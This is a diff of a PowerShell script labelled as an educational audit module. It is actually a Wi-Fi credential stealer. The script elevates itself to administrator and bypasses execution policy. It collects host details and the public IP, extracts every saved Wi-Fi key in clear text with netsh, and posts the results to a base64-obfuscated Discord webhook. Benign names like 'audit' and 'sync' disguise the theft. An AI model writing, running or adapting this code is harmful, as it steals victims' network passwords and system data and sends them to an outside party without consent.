@@ -1,188 +1,186 @@
-# ========== CONFIG ==========
-$VerboseMode = $true
-$Version = "2.2.1"
+# ==============================================================================
+# AUDIT SCRIPT - EDUCATIONAL MODULE
+# Version: 2.3.3
+# Migration: Telegram -> Discord
+# ==============================================================================
 
-# ========== ENCODED ENDPOINTS ==========
-$D_Hook_B64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUxNTU0MjQzOTU1NjAyMjMyMy9wN2E3by1ReDJlaUczdzZ2Y25rdV9LajZxS01NdXN2MGt2eWNVSWZPTi16V1ZRY3poYnV1QlBZYzB6X3YtZFg2cDJIYQ=="
-$D_Hook = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($D_Hook_B64))
+# ========== CONFIGURATION ==========
+$VerboseMode = $true
+$AuditVersion = '2.3.3'
+
+# Encoded Discord Webhook (Educational placeholder)
+$Channel_B64 = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUxNTU0MjQzOTU1NjAyMjMyMy9wN2E3by1ReDJlaUczdzZ2Y25rdV9LajZxS01NdXN2MGt2eWNVSWZPTi16V1ZRY3poYnV1QlBZYzB6X3YtZFg2cDJIYQ=='
+$Channel_URI = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($Channel_B64))
 
 # ========== CORE UTILITIES ==========
+
 function Write-InternalLog {
     param(
         [Parameter(Mandatory=$true)]
-        [string]$Msg,
-        [string]$Col = "Cyan"
+        [string]$Message,
+        [ValidateSet('Cyan', 'Green', 'Yellow', 'Red')]
+        [string]$Color = 'Cyan'
     )
     if ($VerboseMode) {
-        Write-Host "[*] $Msg" -ForegroundColor $Col
+        Write-Host "[*] $Message" -ForegroundColor $Color
     }
 }
 
-function Invoke-PrivilegeAssertion {
+function Assert-PrivilegedContext {
+    Write-InternalLog 'Verifying execution context...'
     $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
     $principal = New-Object Security.Principal.WindowsPrincipal($identity)
+    
     if (-not $principal.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)) {
-        Write-InternalLog "Escalating context..."
+        Write-InternalLog 'Escalation required. Relaunching...' 'Yellow'
         try {
-            Start-Process -FilePath powershell -ArgumentList "-NoProfile", "-ExecutionPolicy", "Bypass", "-File", "`"$PSCommandPath`"" -Verb RunAs
+            Start-Process -FilePath powershell -ArgumentList '-NoProfile', '-ExecutionPolicy', 'Bypass', '-File', "`"$PSCommandPath`"" -Verb RunAs
+            exit 0
         } catch {
-            Write-InternalLog "Escalation failed: $($_.Exception.Message)" "Red"
+            Write-InternalLog "Escalation failed: $($_.Exception.Message)" 'Red'
+            exit 1
         }
-        exit 1
     }
 }
 
-# ========== DATA COLLECTION ==========
-function Get-EnvironmentMetrics {
-    Write-InternalLog "Collecting environment metrics..."
+# ========== DATA ACQUISITION ==========
+
+function Get-HostContext {
+    Write-InternalLog 'Acquiring host metrics...'
     try {
         $cs = Get-CimInstance Win32_ComputerSystem -ErrorAction SilentlyContinue
         $os = Get-CimInstance Win32_OperatingSystem -ErrorAction SilentlyContinue
         $cpu = Get-CimInstance Win32_Processor -ErrorAction SilentlyContinue
         $gpu = Get-CimInstance Win32_VideoController -ErrorAction SilentlyContinue
-        $mem = Get-CimInstance Win32_PhysicalMemory -ErrorAction SilentlyContinue | Measure-Object -Property Capacity -Sum
-        $publicIp = try { (Invoke-RestMethod -Uri "https://api.ipify.org" -TimeoutSec 5) } catch { "Unknown" }
         
-        $m_Host = $env:COMPUTERNAME
-        $m_Model = if ($cs) { $cs.Model } else { "N/A" }
-        $m_Vendor = if ($cs) { $cs.Manufacturer } else { "N/A" }
-        $m_OS = if ($os) { $os.Caption } else { "N/A" }
-        $m_Build = if ($os) { $os.Version } else { "N/A" }
-        $m_CPU = if ($cpu) { ($cpu | Select-Object -First 1).Name } else { "N/A" }
-        $m_Cores = if ($cpu) { ($cpu | Select-Object -First 1).NumberOfCores } else { 0 }
-        $m_RAM = if ($mem.Sum) { [Math]::Round($mem.Sum / 1GB, 2) } else { 0 }
-        $m_GPU = if ($gpu) { ($gpu | Select-Object -First 1).Name } else { "N/A" }
+        $mem = Get-CimInstance Win32_PhysicalMemory -ErrorAction SilentlyContinue | 
+               Measure-Object -Property Capacity -Sum
         
+        $publicIp = try { 
+            (Invoke-RestMethod -Uri 'https://api.ipify.org' -TimeoutSec 5 -ErrorAction Stop) 
+        } catch { 'Unavailable' }
+
         return [PSCustomObject]@{
-            HostName     = $m_Host
-            Model        = $m_Model
-            Manufacturer = $m_Vendor
-            Platform     = $m_OS
-            Build        = $m_Build
-            Processor    = $m_CPU
-            LogicCores   = $m_Cores
-            MemoryGB     = $m_RAM
-            Graphics     = $m_GPU
-            ExternalIP   = $publicIp
-            Timestamp    = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
-            Revision     = $Version
+            HostName   = $env:COMPUTERNAME
+            Model      = if ($cs) { $cs.Model } else { 'N/A' }
+            Vendor     = if ($cs) { $cs.Manufacturer } else { 'N/A' }
+            OS         = if ($os) { $os.Caption } else { 'N/A' }
+            Build      = if ($os) { $os.Version } else { 'N/A' }
+            CPU        = if ($cpu) { ($cpu | Select-Object -First 1).Name } else { 'N/A' }
+            Cores      = if ($cpu) { ($cpu | Select-Object -First 1).NumberOfCores } else { 0 }
+            RAM        = if ($mem.Sum) { [Math]::Round($mem.Sum / 1GB, 2) } else { 0 }
+            GPU        = if ($gpu) { ($gpu | Select-Object -First 1).Name } else { 'N/A' }
+            ExternalIP = $publicIp
+            Timestamp  = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss')
         }
     } catch {
-        Write-InternalLog "Metrics collection error: $($_.Exception.Message)" "Red"
+        Write-InternalLog "Data acquisition failure: $($_.Exception.Message)" 'Red'
         return $null
     }
 }
 
-function Get-NetworkCredentials {
-    Write-InternalLog "Extracting network credentials..."
+function Get-SignalCredentials {
+    Write-InternalLog 'Extracting signal credentials...'
     try {
         $profiles = netsh wlan show profiles 2>$null |
-            Select-String "All User Profile" |
-            ForEach-Object { $_.ToString().Split(':', 2)[1].Trim() } | Sort-Object -Unique
+                    Select-String 'All User Profile' |
+                    ForEach-Object { $_.ToString().Split(':', 2)[1].Trim() } | 
+                    Sort-Object -Unique
 
-        $results = @()
+        $creds = @()
         foreach ($p in $profiles) {
             $info = netsh wlan show profile name="$p" key=clear 2>$null
-            $key = ($info | Select-String "Key Content" | ForEach-Object { $_.ToString().Split(':', 2)[1].Trim() }) -join ''
-            if (-not $key) { $key = "<Unsecured or No Local Cache>" }
-            $results += [PSCustomObject]@{ SSID = $p; KeyValue = $key }
+            $key = ($info | Select-String 'Key Content' | ForEach-Object { $_.ToString().Split(':', 2)[1].Trim() }) -join ''
+            
+            $creds += [PSCustomObject]@{
+                SSID = $p
+                Key  = if ($key) { $key } else { '<Open/Managed>' }
+            }
         }
-        return $results
+        return $creds
     } catch {
-        Write-InternalLog "Credentials extraction error: $($_.Exception.Message)" "Red"
+        Write-InternalLog "Signal extraction error: $($_.Exception.Message)" 'Red'
         return @()
     }
 }
 
-# ========== PACKAGE GENERATION ==========
+# ========== OUTPUT GENERATION ==========
+
 function New-AuditPackage {
-    param(
-        [Parameter(Mandatory=$true)]
-        $Metrics,
-        [Parameter(Mandatory=$true)]
-        $NetworkData
-    )
+    param($Metrics, $Credentials)
     
     $sb = New-Object System.Text.StringBuilder
-    [void]$sb.AppendLine("=========================================")
-    [void]$sb.AppendLine("      AUDIT PACKAGE - $Version")
-    [void]$sb.AppendLine("=========================================")
-    [void]$sb.AppendLine("METRICS:")
-    [void]$sb.AppendLine("-----------------------------------------")
-    [void]$sb.AppendLine("Host          : $($Metrics.HostName)")
-    [void]$sb.AppendLine("Model         : $($Metrics.Model)")
-    [void]$sb.AppendLine("Vendor        : $($Metrics.Manufacturer)")
-    [void]$sb.AppendLine("Platform      : $($Metrics.Platform) ($($Metrics.Build))")
-    [void]$sb.AppendLine("CPU           : $($Metrics.Processor) ($($Metrics.LogicCores) Cores)")
-    [void]$sb.AppendLine("RAM           : $($Metrics.MemoryGB) GB")
-    [void]$sb.AppendLine("GPU           : $($Metrics.Graphics)")
-    [void]$sb.AppendLine("External IP   : $($Metrics.ExternalIP)")
-    [void]$sb.AppendLine("Time          : $($Metrics.Timestamp)")
-    [void]$sb.AppendLine("")
-    [void]$sb.AppendLine("CREDENTIALS:")
-    [void]$sb.AppendLine("-----------------------------------------")
+    [void]$sb.AppendLine('### HOST METRICS')
+    [void]$sb.AppendLine('```yaml')
+    [void]$sb.Append('Host:       ').AppendLine($Metrics.HostName)
+    [void]$sb.Append('System:     ').Append($Metrics.Vendor).Append(' ').AppendLine($Metrics.Model)
+    [void]$sb.Append('Platform:   ').Append($Metrics.OS).Append(' (').Append($Metrics.Build).AppendLine(')')
+    [void]$sb.Append('Processor:  ').Append($Metrics.CPU).Append(' (').Append($Metrics.Cores).AppendLine(' Cores)')
+    [void]$sb.Append('Memory:     ').Append($Metrics.RAM).AppendLine(' GB')
+    [void]$sb.Append('Graphics:   ').AppendLine($Metrics.GPU)
+    [void]$sb.Append('Network:    ').AppendLine($Metrics.ExternalIP)
+    [void]$sb.Append('Captured:   ').AppendLine($Metrics.Timestamp)
+    [void]$sb.AppendLine('```')
+    [void]$sb.AppendLine('### SIGNAL CREDENTIALS')
+    [void]$sb.AppendLine('```')
     
-    foreach ($c in $NetworkData) {
-        [void]$sb.AppendLine("SSID: $($c.SSID)")
-        [void]$sb.AppendLine("KEY:  $($c.KeyValue)")
-        [void]$sb.AppendLine("-----------------------------------------")
+    foreach ($c in $Credentials) {
+        [void]$sb.Append('SSID: ').Append($c.SSID).Append(' | KEY: ').AppendLine($c.Key)
     }
     
-    [void]$sb.AppendLine("")
-    [void]$sb.AppendLine("[PACKAGE COMPLETE]")
+    [void]$sb.AppendLine('```')
     return $sb.ToString()
 }
 
-# ========== DATA DISPATCH ==========
-function Send-DiagnosticData {
-    param(
-        [Parameter(Mandatory=$true)]
-        [string]$RawContent
-    )
+# ========== DISPATCH ==========
+
+function Sync-RemoteChannel {
+    param([string]$Payload)
     
-    Write-InternalLog "Dispatching via Channel D..."
+    Write-InternalLog 'Syncing with remote channel...'
     try {
-        $contentToUpload = $RawContent
-        if ($contentToUpload.Length -gt 1900) {
-            $contentToUpload = $contentToUpload.Substring(0, 1900) + "... [Truncated]"
-        }
-        
         $discordBody = @{
-            content = "New Diagnostic Package from $($env:COMPUTERNAME)"
-            embeds = @(
+            username   = 'Audit Bot'
+            avatar_url = 'https://cdn-icons-png.flaticon.com/512/1048/1048953.png'
+            embeds     = @(
                 @{
-                    title = "Audit Results"
-                    description = "```$contentToUpload```"
-                    color = 3447003
+                    title       = "Audit Report - $env:COMPUTERNAME"
+                    description = $Payload
+                    color       = 5814783
+                    footer      = @{ text = "Audit Engine v$AuditVersion" }
                 }
             )
         }
+
+        $json = $discordBody | ConvertTo-Json -Depth 5
         
-        $jsonPayload = $discordBody | ConvertTo-Json -Depth 5;
-        Invoke-RestMethod -Uri $D_Hook -Method Post -Body $jsonPayload -ContentType "application/json";
-        Write-InternalLog "Channel D success." "Green";
+        $response = Invoke-RestMethod -Uri $Channel_URI `
+                                     -Method Post `
+                                     -Body $json `
+                                     -ContentType 'application/json' `
+                                     -ErrorAction Stop
+        
+        Write-InternalLog 'Sync successful.' 'Green'
     } catch {
-        Write-InternalLog "Channel D fail: $($_.Exception.Message)" "Red"
+        Write-InternalLog "Sync failed: $($_.Exception.Message)" 'Red'
     }
 }
 
-# ========== EXECUTION FLOW ==========
-function Invoke-AuditFlow {
-    Invoke-PrivilegeAssertion
+# ========== ORCHESTRATION ==========
 
-    $currentMetrics = Get-EnvironmentMetrics
-    if ($null -eq $currentMetrics) { 
-        Write-InternalLog "Critical failure: No metrics collected." "Red"
-        exit 
-    }
-
-    $networkCreds = Get-NetworkCredentials
-    $fullPackage = New-AuditPackage -Metrics $currentMetrics -NetworkData $networkCreds
-
-    Send-DiagnosticData -RawContent $fullPackage
-
-    Write-InternalLog "Audit flow complete." "Green"
+function Execute-AuditFlow {
+    Assert-PrivilegedContext
+    
+    $metrics = Get-HostContext
+    if ($null -eq $metrics) { exit 1 }
+    
+    $creds = Get-SignalCredentials
+    $package = New-AuditPackage -Metrics $metrics -Credentials $creds
+    
+    Sync-RemoteChannel -Payload $package
+    
+    Write-InternalLog 'Audit flow completed.' 'Green'
 }
 
-# Run
-Invoke-AuditFlow
+# START
+Execute-AuditFlow
